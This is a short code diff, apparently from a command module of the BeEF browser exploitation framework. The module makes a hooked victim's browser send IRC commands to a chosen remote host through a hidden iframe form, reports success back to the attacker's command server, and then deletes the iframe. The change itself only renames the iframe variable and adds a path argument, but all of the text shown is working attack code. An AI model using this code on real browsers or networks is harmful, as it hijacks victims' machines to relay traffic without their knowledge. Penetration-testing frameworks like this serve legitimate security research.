@@ -25,12 +25,12 @@ beef.execute(function() {
 	irc_commands    += "PRIVMSG " + channel + " :" + message + "\nQUIT\n";
 
 	// send commands
-	var irc_iframe = beef.dom.createIframeIpecForm(rhost, rport, irc_commands);
+	var irc_iframe_<%= @command_id %> = beef.dom.createIframeIpecForm(rhost, rport, "/index.html", irc_commands);
 	beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=IRC command sent");
 
 	// clean up
 	cleanup = function() {
-		document.body.removeChild(irc_iframe);
+		document.body.removeChild(irc_iframe_<%= @command_id %>);
 	}
 	setTimeout("cleanup()", 15000);
 
